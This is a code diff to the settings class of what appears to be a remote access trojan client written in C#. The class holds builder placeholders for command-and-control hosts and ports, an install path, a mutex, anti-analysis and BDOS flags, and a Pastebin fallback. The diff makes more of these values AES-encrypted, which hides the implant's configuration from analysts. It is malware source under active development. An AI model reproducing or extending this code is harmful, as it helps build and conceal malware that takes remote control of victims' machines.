@@ -28,7 +28,7 @@ namespace Client
 #else
         public static string Ports = "%Ports%";
         public static string Hosts = "%Hosts%";
-        public static string Version = "0.4.9E";
+        public static string Version = "%Version%";
         public static string Install = "%Install%";
         public static string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%Folder%"), "%File%");
         public static string Key = "%Key%";
@@ -36,7 +36,7 @@ namespace Client
         public static string Certificate = "%Certificate%";
         public static string Serversignature = "%Serversignature%";
         public static X509Certificate2 ServerCertificate;
-        public static readonly string Anti = "%Anti%";
+        public static string Anti = "%Anti%";
         public static Aes256 aes256;
         public static string Pastebin = "%Pastebin%";
         public static string BDOS = "%BDOS%";
@@ -54,7 +54,12 @@ namespace Client
                 aes256 = new Aes256(Key);
                 Ports = aes256.Decrypt(Ports);
                 Hosts = aes256.Decrypt(Hosts);
+                Version = aes256.Decrypt(Version);
+                Install = aes256.Decrypt(Install);
+                MTX = aes256.Decrypt(MTX);
                 Pastebin = aes256.Decrypt(Pastebin);
+                Anti = aes256.Decrypt(Anti);
+                BDOS = aes256.Decrypt(BDOS);
                 Serversignature = aes256.Decrypt(Serversignature);
                 ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
                 return VerifyHash();
